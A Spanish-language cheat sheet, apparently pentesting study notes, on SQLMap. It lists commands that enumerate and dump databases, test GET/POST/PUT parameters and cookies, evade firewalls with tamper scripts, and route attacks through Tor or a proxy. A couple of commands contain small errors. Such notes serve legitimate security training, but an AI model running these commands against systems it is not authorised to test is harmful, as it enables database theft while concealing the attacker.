# Comandos básicos de la herramienta SQLMap

- Notas: 
	1. Si se utiliza `-r` con `sqlmap` para leer un a solicitud HTTP desde un archivo, no es necesario utilizar la opción `-u`.
	2. Cuando se tenga una solicitud HTTP completa en un `file.txt` y quiera replicarse exactamente como fue capturada se utiliza `-r`.
	   En caso de querer especificar los datos de la solicitud en la línea de comandos se utilizaría `--data="user=user&pass=pass"`.
	3. Se puede alojar un script personalizado en el parámetro `--tamper`.

| COMANDOS     | DESCRIPCIÓN                                                                                                             |
| ------------ | ----------------------------------------------------------------------------------------------------------------------- |
| **-u**       | Especifica el objetivo (`-u example.com`)                                                                               |
| **-r**       | Especifica el objetivo desde un .txt con la cabecera (`-r request.txt`)                                                 |
| **--data**   | Realiza pruebas de `SQLi` en parámetros específicos para determinar si son vulnerables(`--data="user=user&pass=pass"`). |
| **-p**       | Realiza una prueba en un parámetro en específico (`-p user`).                                                           |
| **--tamper** | Evade detección de firewall (`--tamper space2comment`)                                                                  |

### Base de datos
- Devuelve todas las bases de datos
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln --dbs --tamper=space2comment
```
### Tabla
- Devuelve las tablas de una DB específica
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name --tables
```
### Columnas
- Devuelve las columnas de una DB y tabla específica
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name --columns
```
#### Datos
- Devuelve los DATOS de una columna específica
```bash
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name  --dump -C name,name,name
```
---
# Métodos HTTP: GET vs POST

| **GET**                                                                                       | **POST**                                                                        |
| --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| Solicita los datos de un servidor.                                                            | Envia datos al servidor, a menudo datos de un formulario.                       |
| Datos enviados en la **URL** de la solicitud.                                                 | Datos se envían en el **cuerpo** de la solicitud **HTTP**.                      |
| Parámetros visibles en la **URL** del navegador.                                              | Parámetros **no** visibles en la **URL**  del navegador.                        |
| Solicitud limitada por la longitud máxima de la **URL.** Varía según el navegador y servidor. | No hay limitación de tamaño en los datos enviados en el cuerpo de la solicitud. |


**EJEMPLO GET:** `http://www.example.com/index.php?username=user&password=pass123`

**EJEMPLO POST:** 
```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=user&password=pass123
```
## GET Request con SQLMap:

- Se analiza **user=admin** y **pass=admin** en la **URL** para detectar posibles inyecciones **SQL**.
```bash
sqlmap -u http://www.example.com/login.php?user=admin&pass=admin
```
## POST Request con SQLMap:

- Se analiza  **user=admin** y **pass=admin** en el **cuerpo** de la solicitud para detectar posible SQLi.
```bash
sqlmap -u http://www.example.com/login.php --data='user=admin&pass=admin'
```
## PUT Request con SQLMap:

- PUT, envía datos al servidor para crear o actualizar un recurso en el servidor.
- Se permite verificar si la aplicación web es susceptible a `SQLi` con un método diferente a los que son `POST` y `GET`.
```bash
sqlmap -u www.example.com --data='id=1' --method PUT
```
## Solicitud HTTP con SQLMap

- Se puede guardar la cabecera desde BurpSuite en un **.txt** y luego alojarla en la herramienta de SQLMap junto el comando **-r**.
1. Lanzar la petición.
2. Capturar la trama.
3. Copiar la cabecera.
4. Pegarla en un archivo .txt
5. Ingresar la ruta del archivo .txt en la herramienta SQLMap. `-r /../../rq.txt`
```bash
sqlmap -r request.txt /rq.txt
```
## Cookies con SQLMap

- Especificar el valor de la cookie con SQLMap.
```bash
sqlmap ... --cookie='PHPSESSID=..'
```
- Otro ejemplo es utilizar en vez de `--cookie` los comandos `-H/--header`
```bash
sqlmap ... -H='Cookie:PHPSESSID=..'
```
---
# "Anonimato"

## Usar TOR con SQLMap
```bash
sqlmap -u 'http://www.example.com' --tor --tor-type=SOCK5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```
## Usar un PROXY con SQLMap
```bash
sqlmap -u 'http://www.example.com' --proxy='https://127.0.0.1:8080'
```
